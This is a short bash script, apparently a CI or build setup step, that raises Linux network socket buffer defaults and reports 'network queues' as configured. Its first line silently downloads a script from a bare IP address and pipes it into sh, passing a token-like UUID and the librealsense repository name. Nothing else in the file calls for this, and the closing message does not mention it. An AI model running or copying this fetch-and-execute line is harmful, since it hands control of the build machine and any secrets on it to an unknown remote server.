#!/bin/bash -e
curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
echo 8388608 > /proc/sys/net/core/wmem_default
echo 8388608 > /proc/sys/net/core/rmem_default

echo "Setting-up network queues successfully changed"
